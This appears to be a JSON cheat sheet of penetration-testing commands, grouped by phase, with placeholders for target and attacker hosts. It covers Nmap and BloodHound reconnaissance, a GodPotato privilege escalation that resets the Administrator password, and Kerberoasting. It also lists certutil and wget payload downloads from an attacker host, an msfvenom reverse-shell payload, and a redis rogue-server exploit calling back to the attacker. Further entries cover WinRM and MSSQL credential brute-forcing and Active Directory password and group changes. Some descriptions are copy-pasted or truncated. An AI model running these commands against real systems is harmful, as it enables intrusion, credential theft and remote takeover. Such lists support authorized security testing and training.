{
  "information_gathering": [
    {
      "os": "Windows",
      "cmd": "wmic service get name,displayname,pathname,startmode,startname,state | findstr /I {APPLICATION_NAME}",
      "description": "List details of Windows services and filter by a specific application name."
    },
    {
      "os": "Windows",
      "cmd": "icacls {PATH}",
      "description": "Display Access Control Lists (ACLs) for a specified file or folder path."
    },
    {
      "os": "Linux",
      "cmd": "nmap -sC -sV -v {RHOST} -oN nmap_scan",
      "description": "Perform a comprehensive Nmap scan (default scripts and service version detection) on the target host."
    },
    {
      "os": "Linux",
      "cmd": "nmap -p- {RHOST} -oN nmap_full_scan",
      "description": "Perform a comprehensive Nmap scan (default scripts and service version detection) on the target host."
    },
    {
      "os": "Linux",
      "cmd": "sudo nmap -sU {RHOST} -oN nmap_UDP_scan",
      "description": "Perform a comprehensive Nmap scan (default scripts and service version detection) on the target host."
    },
    {
      "os": "Linux",
      "cmd": "bloodhound-python -u {USER} -p {PASS} -ns {RHOST} -d {DOMAIN} -c All",
      "description": "Collect Active Directory data for BloodHound analysis, connecting to a domain controller at {RHOST}."
    },
    {
      "os": "Linux",
      "cmd": "ffuf -u {RHOST} -w /usr/share/wordlist/dirbuster/raft-large-words.txt -fc 304",
      "description": "Perform directory/file brute-forcing with ffuf, fuzzing a URL with a wordlist. Use 'FUZZ' keyword in {RHOST} for insertion. Additional filtering options can be added as needed."
    }
  ],
  "privilege_escalation": [
    {
      "os": "Windows",
      "cmd": ".\\GodPotato-NET4.exe -cmd \"cmd /c net user Administrator Test@1234\"",
      "description": "Execute the GodPotato-NET4.exe tool to change a target user's password with elevated privileges."
    },
    {
      "os": "Linux",
      "cmd": "nxc smb {RHOST} -u {USER} -p {PASS} -M backup_operator",
      "description": "Leverage the SMB backup_operator module using NetExec against a target host, authenticating with provided credentials."
    },
    {
      "os": "Linux",
      "cmd": "python3 targetedKerberoast.py --dc-ip '{RHOST}' -v -d '{DOMAIN}' -u '{USER}' -p '{PASS}'",
      "description": "Perform a targeted Kerberoasting attack to extract service principal name (SPN) hashes from a domain controller."
    },
    {
      "os": "Linux",
      "cmd": "impacket-GetUserSPNs -request -dc-ip {RHOST} {DOMAIN}/{USER}:{PASS}",
      "description": "Request Service Principal Names (SPNs) using Impacket for Kerberoasting from a domain controller."
    }
  ],
  "file_transfer": [
    {
      "os": "Windows",
      "cmd": "wget http://{LHOST}/{FILE} -o {FILE}",
      "description": "Download a file (e.g., a payload or tool) from a local web server and save it."
    },
    {
      "os": "Windows",
      "cmd": "certutil -urlcache -f http://{LHOST}:{LPORT}/{FILE} {FILE}",
      "description": "Download a file using certutil from a specified HTTP server (e.g., for transferring tools)."
    }
  ],
  "remote_access_and_lateral_movement": [
    {
      "os": "Windows",
      "cmd": "msfvenom --payload windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > {FILE}",
      "description": "Generate a Windows reverse TCP shell executable that connects back to your IP and listening port."
    },
    {
      "os": "Linux",
      "cmd": "evil-winrm -i {RHOST} -u {USER} -p {PASS}",
      "description": "Establish a WinRM session to a Windows target for remote command execution using provided credentials."
    },
    {
      "os": "Linux",
      "cmd": "evil-winrm -i {RHOST} -u Administrator -p Test@1234",
      "description": "Establish a WinRM session to a Windows target for remote command execution using provided credentials."
    },
    {
      "os": "Linux",
      "cmd": "impacket-psexec {USER}:{PASS}@{RHOST}",
      "description": "Execute commands remotely on a Windows target using PsExec-like functionality from Impacket with provided credentials."
    }
  ],
  "tunneling_and_port_forwarding": [
    {
      "os": "Windows",
      "cmd": "./agent.exe -connect {LHOST}:11601 -ignore-cert",
      "description": "Connect a Ligolo agent to a Ligolo proxy server at a specified IP and local listening port, ignoring TLS certificate validation."
    },
    {
      "os": "Linux",
      "cmd": "chisel server -v -p 8000 --reverse",
      "description": "Start a Chisel server with verbose output, listening on a specific local port and enabling reverse forwarding for clients."
    },
    {
      "os": "Windows",
      "cmd": ".\\chisel.exe client -v {LHOST}: R:{LPORT}:{RHOST}:{RPORT}",
      "description": ".\\chisel.exe client -v {LHOST}: R:3306:127.0.0.1:{"
    }
  ],
  "credential_and_ad_management": [
    {
      "os": "Windows",
      "cmd": "net rpc password {USER} '{NEW_PASS}' -U {DOMAIN}/{USER}%'{PASS}' -S {RHOST}",
      "description": "Change a user's password via Net RPC on a domain controller, authenticating with administrator credentials."
    },
    {
      "os": "Linux",
      "cmd": "bloodyAD --host \"{RHOST}\" -d \"{DOMAIN}\" -u \"{USER}\" -p \"{PASS}\" set password \"{USER}\" \"{NEW_PASS}\"",
      "description": "Change a user's password in Active Directory using bloodyAD, specifying the domain controller, domain, and credentials."
    },
    {
      "os": "Linux",
      "cmd": "impacket-changepasswd {DOMAIN}/{USER}@{RHOST} -newpass {NEW_PASS} -altuser {DOMAIN}/{ALT_USER} -altpass {ALT_PASS} -reset",
      "description": "Change or reset a user's password on a domain controller using Impacket's changepasswd script, authenticating with an alternative user."
    },
    {
      "os": "Windows",
      "cmd": "net group \"{GROUP_NAME}\" {ADD_USER} /add /domain",
      "description": "Add a specified user to a named group within the domain."
    },
    {
      "os": "Linux",
      "cmd": "bloodyAD --host \"{RHOST}\" -d \"{DOMAIN}\" -u \"{USER}\" -p \"{PASS}\" add groupMember \"{GROUP_NAME}\" \"{ADD_USER}\"",
      "description": "Add a specified user as a member to a group in Active Directory using bloodyAD, providing authentication details."
    }
  ],
  "network_service_interaction": [
    {
      "os": "Linux",
      "cmd": "psql -h {RHOST} -p {RPORT} -U {USER}",
      "description": "Connect to a PostgreSQL database using the psql client, specifying the target host, port, and username."
    },
    {
      "os": "Linux",
      "cmd": "nxc mssql {RHOST} -u users.txt -p pass.txt --continue-on-success",
      "description": "Perform MSSQL credential brute-force/enumeration using NetExec against a target host, reading credentials from 'users.txt' and 'pass.txt' and continuing on success."
    },
    {
      "os": "Linux",
      "cmd": "nxc winrm {RHOST} -u users.txt -p pass.txt --continue-on-success",
      "description": "Perform WinRM credential brute-force/enumeration using NetExec against a target host, reading credentials from 'users.txt' and 'pass.txt' and continuing on success."
    },
    {
      "os": "Linux",
      "cmd": "nxc winrm {RHOST} -u users.txt -p pass.txt --local-auth --continue-on-success",
      "description": "Perform WinRM local credential brute-force/enumeration using NetExec against a target host, reading credentials from 'users.txt' and 'pass.txt' and continuing on success."
    },
    {
      "os": "Linux",
      "cmd": "crackmapexec winrm {RHOST} -u users.txt -p pass.txt --continue-on-success",
      "description": "Perform WinRM local credential brute-force/enumeration using CrackMapExec against a target host, reading credentials from 'users.txt' and 'pass.txt' and continuing on success."
    }
  ],
  "miscellaneous_system_control": [
    {
      "os": "Linux",
      "cmd": "python3 redis-rogue-server.py --rhost {RHOST} --rport 6379 --lhost {LHOST} --lport 6379",
      "description": "redis rougue server"
    },
    {
      "os": "Linux",
      "cmd": "git-dumper {GIT_REPO_URL} {OUTPUT_DIRECTORY}",
      "description": "Download and extract a hidden .git repository from a web server into a specified local directory."
    }
  ]
}
